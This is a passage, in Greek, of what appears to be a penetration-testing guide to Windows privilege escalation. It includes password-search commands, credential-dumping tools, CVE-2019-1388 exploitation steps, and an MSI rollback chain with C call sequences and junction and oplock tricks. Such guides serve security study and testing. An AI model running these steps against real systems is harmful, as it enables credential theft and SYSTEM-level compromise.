διαχειριστή.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **ταυτοποιείται μέσω ενός class ID (CLSID)** και κάθε στοιχείο εκθέτει λειτουργικότητα μέσω μίας ή περισσότερων διεπαφών, οι οποίες ταυτοποιούνται μέσω interface IDs (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται αντίστοιχα στο registry, στις θέσεις **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface**. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry **InProcServer32**, το οποίο περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε ένα **DLL** και μια τιμή με όνομα **ThreadingModel**, η οποία μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single ή Multi) ή **Neutral** (Thread Neutral).

![Ιστορικό προγραμμάτων περιήγησης - COM DLL Overwriting: Μέσα στα CLSID αυτού του registry μπορείτε να βρείτε το θυγατρικό registry InProcServer32, το οποίο περιέχει μια προεπιλεγμένη τιμή που δείχνει σε ένα DLL και μια τιμή...](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **αντικαταστήσετε οποιοδήποτε από τα DLL** που πρόκειται να εκτελεστούν, θα μπορούσατε να **κλιμακώσετε τα προνόμιά σας**, εφόσον το συγκεκριμένο DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι attackers χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και registry**

**Αναζήτηση στα περιεχόμενα αρχείων**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Αναζήτηση αρχείου με συγκεκριμένο όνομα**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα plugin του msf** που δημιούργησα για να **εκτελεί αυτόματα κάθε POST module του metasploit που αναζητά credentials** στο σύστημα του θύματος.\
Το [**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης και αναφέρονται σε αυτήν τη σελίδα.\
Το [**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** για διάφορα εργαλεία που αποθηκεύουν αυτά τα δεδομένα σε απλό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY και RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **δημιουργεί επίσης μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά δικαιώματα, η οποία όμως κληρονομεί όλα τα ανοιχτά handles της κύριας διεργασίας**.\
Έπειτα, αν έχετε **πλήρη πρόσβαση στη διεργασία με τα χαμηλά δικαιώματα**, μπορείτε να αποκτήσετε το **ανοιχτό handle προς την προνομιούχα διεργασία** που δημιουργήθηκε με `OpenProcess()` και να **κάνετε inject ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με το **πώς να εντοπίσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πληρέστερη εξήγηση σχετικά με το πώς να ελέγξετε και να καταχραστείτε περισσότερα ανοιχτά handles διεργασιών και threads, τα οποία κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινόχρηστης μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, η οποία επιτρέπει σε μη συσχετισμένες διεργασίες να ανταλλάσσουν δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό θυμίζει αρχιτεκτονική client/server, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν ένας **client** στέλνει δεδομένα μέσω ενός pipe, ο **server** που δημιούργησε το pipe μπορεί να **υιοθετήσει την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe το οποίο μπορείτε να μιμηθείτε σάς δίνει την ευκαιρία να **αποκτήσετε υψηλότερα δικαιώματα**, υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, δείτε τους χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το ακόλουθο εργαλείο επιτρέπει την **υποκλοπή επικοινωνίας named pipe με ένα εργαλείο όπως το Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει την απαρίθμηση και προβολή όλων των pipes για τον εντοπισμό privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Η υπηρεσία Telephony (TapiSrv), σε λειτουργία server, εκθέτει το `\\pipe\\tapsrv` (MS-TRP). Ένας απομακρυσμένος, πιστοποιημένος client μπορεί να καταχραστεί τη διαδρομή ασύγχρονων συμβάντων που βασίζεται σε mailslot, ώστε να μετατρέψει το `ClientAttach` σε αυθαίρετη **εγγραφή 4 byte** σε οποιοδήποτε υπάρχον αρχείο στο οποίο έχει δικαίωμα εγγραφής το `NETWORK SERVICE`, και στη συνέχεια να αποκτήσει δικαιώματα διαχειριστή Telephony και να φορτώσει αυθαίρετο DLL ως υπηρεσία. Η πλήρης ροή:

- `ClientAttach` με το `pszDomainUser` ορισμένο σε μια υπάρχουσα διαδρομή με δικαίωμα εγγραφής → η υπηρεσία την ανοίγει μέσω `CreateFileW(..., OPEN_EXISTING)` και τη χρησιμοποιεί για εγγραφές ασύγχρονων συμβάντων.
- Κάθε συμβάν γράφει στο συγκεκριμένο handle το `InitContext` που ελέγχεται από τον attacker και ορίζεται μέσω του `Initialize`. Καταχωρίστε μια εφαρμογή line με το `LRegisterRequestRecipient` (`Req_Func 61`), ενεργοποιήστε το `TRequestMakeCall` (`Req_Func 121`), λάβετε τα συμβάντα μέσω του `GetAsyncEvents` (`Req_Func 0`) και έπειτα καταργήστε την καταχώριση/τερματίστε τη λειτουργία, ώστε να επαναλάβετε ντετερμινιστικά τις εγγραφές.
- Προσθέστε τον εαυτό σας στο `[TapiAdministrators]` στο `C:\Windows\TAPI\tsec.ini`, επανασυνδεθείτε και, στη συνέχεια, καλέστε το `GetUIDllName` με μια αυθαίρετη διαδρομή DLL για να εκτελέσετε το `TSPI_providerUIIdentify` ως `NETWORK SERVICE`.

Περισσότερες λεπτομέρειες:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν περιεχόμενο στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Κατάχρηση Protocol handler / ShellExecute μέσω Markdown renderers

Οι Markdown σύνδεσμοι στους οποίους μπορείτε να κάνετε κλικ και οι οποίοι προωθούνται στο `ShellExecuteExW` μπορούν να ενεργοποιήσουν επικίνδυνους URI handlers (`file:`, `ms-appinstaller:` ή οποιοδήποτε καταχωρισμένο scheme) και να εκτελέσουν αρχεία που ελέγχονται από τον attacker ως ο τρέχων χρήστης. Δείτε:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για κωδικούς πρόσβασης**

Όταν αποκτάτε ένα shell ως χρήστης, ενδέχεται να εκτελούνται προγραμματισμένες εργασίες ή άλλες διεργασίες που **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω script καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από χρήστη χαμηλών προνομίων σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Αν έχετε πρόσβαση στο γραφικό περιβάλλον (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελέσετε ένα τερματικό ή οποιαδήποτε άλλη διεργασία ως "NT\AUTHORITY SYSTEM", από έναν χρήστη χωρίς προνόμια.

Έτσι, είναι δυνατό να κλιμακώσετε τα προνόμια και να παρακάμψετε το UAC ταυτόχρονα, αξιοποιώντας την ίδια ευπάθεια. Επιπλέον, δεν χρειάζεται να εγκαταστήσετε τίποτα, ενώ το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Μερικά από τα συστήματα που επηρεάζονται είναι τα εξής:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, πρέπει να εκτελέσετε τα ακόλουθα βήματα:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Έχετε όλα τα απαραίτητα αρχεία και τις πληροφορίες στο ακόλουθο GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να **μάθετε σχετικά με τα Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα **διαβάστε αυτό για να μάθετε σχετικά με το UAC και τα UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions καταλόγου upload σε served root

Μια εφαρμογή μπορεί να δημιουργεί έναν προβλέψιμο υποκατάλογο upload, να γράφει σε αυτόν ένα όνομα αρχείου που παρέχεται από τον καλούντα και έπειτα να επεξεργάζεται το αρχείο. Αν ένας χρήστης με χαμηλά δικαιώματα μπορεί να διαγράψει και να αντικαταστήσει αυτόν τον υποκατάλογο με NTFS junction πριν από την εγγραφή από την πλευρά του server, η εγγραφή μπορεί να ακολουθήσει το junction και να καταλήξει σε έναν κατάλογο που εξυπηρετείται από τον web server. Ένα script που τοποθετείται εκεί μπορεί να εκτελεστεί με την ταυτότητα του web service, αν ο server εκτελεί αυτόν τον τύπο αρχείου. Πρόκειται για ένα όριο αυθαίρετης εγγραφής που εξαρτάται από την εφαρμογή· ένας κατάλογος upload με δικαίωμα εγγραφής ή ένα υπάρχον junction από μόνο του δεν το αποδεικνύει.

Ελέγξτε την ακριβή κατασκευή της διαδρομής και τον χρονισμό στο upload handler, τα πραγματικά δικαιώματα του χρήστη για διαγραφή/δημιουργία στον υποκατάλογο, τα πραγματικά ACL του προορισμού, αν το πρόγραμμα εγγραφής ακολουθεί reparse points και αν ο web server εκτελεί αρχεία σε αυτόν τον προορισμό. Επιβεβαιώστε ξεχωριστά τις ταυτότητες διεργασίας του προγράμματος εγγραφής και του web server. Η παθητική απογραφή μπορεί να εμφανίσει τα ACL καταλόγων και τα μεταδεδομένα reparse, αλλά δεν μπορεί να εξακριβώσει τη συμπεριφορά του handler ή μια μελλοντική αλλαγή junction. Αν η εκτέλεση καταλήξει σε λογαριασμό service, ελέγξτε το **πραγματικό token διεργασίας** πριν εξετάσετε οποιαδήποτε ξεχωριστή διαδρομή μέσω token privileges.

## Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία φακέλου σε SYSTEM EoP

Η τεχνική που περιγράφεται [**σε αυτό το blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), με exploit code [**διαθέσιμο εδώ**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Η επίθεση βασίζεται στην κατάχρηση της λειτουργίας rollback του Windows Installer, ώστε να αντικατασταθούν νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό, ο επιτιθέμενος πρέπει να δημιουργήσει ένα **κακόβουλο MSI installer**, το οποίο θα χρησιμοποιηθεί για την παραβίαση του φακέλου `C:\Config.Msi`. Στη συνέχεια, ο Windows Installer θα χρησιμοποιήσει αυτόν τον φάκελο για την αποθήκευση αρχείων rollback κατά την απεγκατάσταση άλλων MSI packages, όπου τα αρχεία rollback θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

### Έγχυση διαδρομής cleanup του Windows Installer COM (CVE-2025-27727)

Ένας client με χαμηλά δικαιώματα μπορεί να αποκτήσει πρόσβαση στην υπηρεσία SYSTEM `msiexec.exe` μέσω του COM object `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Η reverse engineering εντόπισε τις σχετικές κλήσεις `IMsiServer`: `MsiBeginTransactionW` στο vtable offset `0xA0`, `SetEEUIDirectoryAndFilter` στο `0xC8` και `CleanupTempPackages` στο `0x50`. Αυτά τα ονόματα και offsets προέκυψαν μέσω reverse engineering και ενδέχεται να διαφέρουν μεταξύ builds.<sup>[[41]](#references)</sup>

Για χρήστη που δεν είναι administrator, η `SetEEUIDirectoryAndFilter` κάνει impersonate τον καλούντα μόνο κατά το άνοιγμα της παρεχόμενης διαδρομής με `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` και `FILE_FLAG_OPEN_REPARSE_POINT`. Αυτό αποδεικνύει ότι ο καλών μπορεί να διαγράψει τον κατάλογο και αποτρέπει την ακολούθηση ενός reparse point, αλλά **δεν** συνδέει το ελεγμένο file object με το μεταγενέστερο cleanup ούτε αποδεικνύει ότι το δημιούργησε το Windows Installer.<sup>[[41]](#references)</sup>

Μετά την `MsiBeginTransactionW`, η `SetEEUIDirectoryAndFilter` προγραμματίζει τη διαδρομή ως φάκελο, ανεξάρτητα από το όρισμα filter του καλούντος. Η υπηρεσία γράφει μια επώνυμη τιμή `REG_DWORD` κάτω από το `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: το όνομα της τιμής είναι η διαδρομή που ελέγχει ο καλών και τα δεδομένα `0x00000002` αποτελούν τη σημαία φακέλου. Έπειτα, η `CleanupTempPackages(NULL, FALSE)` μεταβαίνει απευθείας στη διαδικασία cleanup. Το elevated worker της απαριθμεί τις τιμές registry και περνά τις εγγραφές φακέλων στην αναδρομική `FDeleteFolder`, χωρίς να ελέγχει την προέλευση της διαδρομής. Αν αποτύχει η κανονική αφαίρεση, ο κώδικας καλεί επίσης τη `LockdownPath`, εκκαθαρίζει τα file attributes και επαναλαμβάνει την προσπάθεια.<sup>[[41]](#references)</sup>

Η ελάχιστη ακολουθία κλήσεων που ανακτήθηκε από το `msi.dll` είναι:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Το χρήσιμο primitive είναι η επαναχρησιμοποίηση διαδρομής και όχι η ανακατεύθυνση μέσω junction. Καταχωρίστε ένα `C:\Config.Msi` που δημιουργήθηκε από attacker, αφαιρέστε το και αφήστε το Windows Installer να δημιουργήσει αργότερα ξανά το ίδιο pathname με προστατευμένα δεδομένα rollback. Το cleanup εμπιστεύεται το παλιό όνομα `TempPackages` και διαγράφει τον νέο directory ως SYSTEM. Αυτό παρακάμπτει το προβλεπόμενο όριο των mitigations `FILE_FLAG_OPEN_REPARSE_POINT` και redirection-trust, επειδή δεν απαιτείται reparse point.<sup>[[41]](#references)</sup>

Αυτό το primitive διαγραφής εντάσσεται στην παρακάτω αλυσίδα rollback: διατηρήστε ξεχωριστά το record `Installer\Folders`, διαγράψτε το προστατευμένο `C:\Config.Msi`, δημιουργήστε το ξανά με NULL DACL και διατηρήστε ένα handle με δικαίωμα `WRITE_DAC` πριν το installer ενισχύσει το DACL. Το ήδη ανοιχτό handle μπορεί να επαναφέρει ένα permissive DACL με `NtSetSecurityObject`, μετά το οποίο το παραγόμενο `.rbs` μπορεί να αντικατασταθεί πριν συνεχιστεί το rollback.<sup>[[41]](#references)</sup>

Η Microsoft διόρθωσε το path, εμποδίζοντας το `CMsiTransaction::SetEEUIDirectoryAndFilter` να καλεί το `ScheduleFileOrFolderDelete` όταν είναι ενεργοποιημένο το νέο feature gate. Η κλήση COM μπορεί και πάλι να επιστρέψει επιτυχία, αλλά πλέον δεν προσθέτει το path που ελέγχει ο attacker στο `TempPackages`. Εγκαταστήστε τις ενημερώσεις ασφαλείας των Windows του Απριλίου 2025 αντί να χρησιμοποιείτε την επιτυχή επιστροφή της μεθόδου ως έλεγχο για το αν εφαρμόστηκε το patch.<sup>[[41]](#references)[[42]](#references)</sup>

Η συνοπτική τεχνική είναι η εξής:

1. **Στάδιο 1 – Προετοιμασία για το Hijack (αφήστε το `C:\Config.Msi` κενό)**

- Βήμα 1: Εγκαταστήστε το MSI
    - Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε φάκελο με δυνατότητα εγγραφής (`TARGETDIR`).
    - Ορίστε τον installer ως **"UAC Compliant"**, ώστε να μπορεί να εκτελεστεί από **χρήστη που δεν είναι admin**.
    - Κρατήστε ανοιχτό ένα **handle** προς το αρχείο μετά την εγκατάσταση.

- Βήμα 2: Ξεκινήστε το Uninstall
    - Κάντε uninstall το ίδιο `.msi`.
    - Η διαδικασία uninstall αρχίζει να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (αντίγραφα ασφαλείας rollback).
    - **Κάντε polling στο ανοιχτό handle** με το `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Custom συγχρονισμός
    - Το `.msi` περιλαμβάνει μια **custom ενέργεια uninstall (`SyncOnRbfWritten`)** η οποία:
        - Σηματοδοτεί ότι έχει γραφτεί το `.rbf`.
        - Έπειτα **περιμένει** ένα άλλο event πριν συνεχίσει το uninstall.

- Βήμα 4: Αποτρέψτε τη διαγραφή του `.rbf`
    - Όταν λάβετε το σήμα, **ανοίξτε το αρχείο `.rbf`** χωρίς `FILE_SHARE_DELETE` — αυτό **εμποδίζει τη διαγραφή του**.
    - Έπειτα **στείλτε σήμα πίσω**, ώστε να ολοκληρωθεί το uninstall.
    - Το Windows Installer αποτυγχάνει να διαγράψει το `.rbf` και, επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **δεν αφαιρείται το `C:\Config.Msi`**.

- Βήμα 5: Διαγράψτε χειροκίνητα το `.rbf`
    - Εσείς (ο attacker) διαγράφετε χειροκίνητα το αρχείο `.rbf`.
    - Τώρα το **`C:\Config.Msi` είναι κενό**, έτοιμο για hijack.

> Σε αυτό το σημείο, **ενεργοποιήστε την ευπάθεια διαγραφής αυθαίρετου φακέλου σε επίπεδο SYSTEM** για να διαγράψετε το `C:\Config.Msi`.

2. **Στάδιο 2 – Αντικατάσταση των Rollback Scripts με κακόβουλα**

- Βήμα 6: Δημιουργήστε ξανά το `C:\Config.Msi` με αδύναμα ACL
    - Δημιουργήστε ξανά τον φάκελο `C:\Config.Msi`.
    - Ορίστε **αδύναμα DACL** (π.χ. Everyone:F) και **κρατήστε ανοιχτό ένα handle** με δικαίωμα `WRITE_DAC`.

- Βήμα 7: Εκτελέστε μια άλλη εγκατάσταση
    - Εγκαταστήστε ξανά το `.msi`, με:
        - `TARGETDIR`: Τοποθεσία με δυνατότητα εγγραφής.
        - `ERROROUT`: Μια μεταβλητή που προκαλεί αναγκαστική αποτυχία.
    - Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να ενεργοποιήσει ξανά το **rollback**, το οποίο διαβάζει τα `.rbs` και `.rbf`.

- Βήμα 8: Παρακολουθήστε για `.rbs`
    - Χρησιμοποιήστε το `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
    - Καταγράψτε το όνομα του αρχείου.

- Βήμα 9: Συγχρονιστείτε πριν από το rollback
    - Το `.msi` περιέχει μια **custom ενέργεια install (`SyncBeforeRollback`)** η οποία:
        - Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
        - Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Εφαρμόστε ξανά τα αδύναμα ACL
    - Αφού λάβετε το event ` .rbs created`:
        - Το Windows Installer **εφαρμόζει ξανά ισχυρά ACL** στο `C:\Config.Msi`.
        - Όμως, αφού εξακολουθείτε να έχετε ένα handle με δικαίωμα `WRITE_DAC`, μπορείτε να **εφαρμόσετε ξανά αδύναμα ACL**.

> Τα ACL **εφαρμόζονται μόνο όταν ανοίγει το handle**, επομένως μπορείτε να συνεχίσετε να γράφετε στον φάκελο.

- Βήμα 11: Τοποθετήστε ψεύτικα `.rbs` και `.rbf`
    - Αντικαταστήστε το αρχείο `.rbs` με ένα **ψεύτικο rollback script** που δίνει εντολή στα Windows να:
        - Επαναφέρουν το αρχείο `.rbf` σας (κακόβουλο DLL) σε μια **προνομιακή τοποθεσία** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Τοποθετήστε το ψεύτικο `.rbf` που περιέχει ένα **κακόβουλο payload DLL επιπέδου SYSTEM**.

- Βήμα 12: Ενεργοποιήστε το Rollback
    - Στείλτε σήμα στο event συγχρονισμού, ώστε να συνεχίσει ο installer.
    - Έχει ρυθμιστεί μια **custom action τύπου 19 (`ErrorOut`)** ώστε να **προκαλέσει σκόπιμα αποτυχία στην εγκατάσταση** σε ένα γνωστό σημείο.
    - Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: Το SYSTEM εγκαθιστά το DLL σας
    - Το Windows Installer:
        - Διαβάζει το κακόβουλο `.rbs`.
        - Αντιγράφει το DLL `.rbf` στη στοχευμένη τοποθεσία.
    - Τώρα έχετε το **κακόβουλο DLL σε path που φορτώνεται από το SYSTEM**.

- Τελικό Βήμα: Εκτελέστε κώδικα SYSTEM
    - Εκτελέστε ένα έμπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που κάνατε hijack.
    - **Έτοιμο**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από αυθαίρετη διαγραφή/μετακίνηση/μετονομασία αρχείων σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) προϋποθέτει ότι μπορείτε να διαγράψετε **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Τι γίνεται όμως αν η ευπάθειά σας επιτρέπει μόνο **διαγραφή αυθαίρετων αρχείων**;

Θα μπορούσατε να εκμεταλλευτείτε τα **εσωτερικά του NTFS**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Επομένως, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το filesystem.

Μπορείτε να το κάνετε αυτό χρησιμοποιώντας τυπικά API διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Παρότι καλείς ένα API διαγραφής *αρχείου*, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν επιτρέπει να διαγράψεις αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχει ο επιτιθέμενος**;

1. Βήμα 1: Ρύθμισε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτόν: `C:\temp\folder1\file1.txt`

2. Βήμα 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια προνομιούχα διεργασία επιχειρεί να διαγράψει το `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Βήμα 3: Ενεργοποίηση διεργασίας SYSTEM (π.χ., `SilentCleanup`)
- Αυτή η διεργασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει τα περιεχόμενά τους.
- Όταν φτάσει στο `file1.txt`, **ενεργοποιείται το oplock** και παραδίδει τον έλεγχο στο callback σας.

4. Βήμα 4: Μέσα στο callback του oplock – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακινήστε το `file1.txt` αλλού
    - Αυτό αδειάζει το `folder1` χωρίς να διακόψει το oplock.
    - Μην διαγράψετε απευθείας το `file1.txt` — αυτό θα αποδέσμευε πρόωρα το oplock.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Αυτό στοχεύει το εσωτερικό stream του NTFS που αποθηκεύει metadata φακέλων — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει το `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Αποτέλεσμα**: Το `C:\Config.Msi` διαγράφεται από το SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

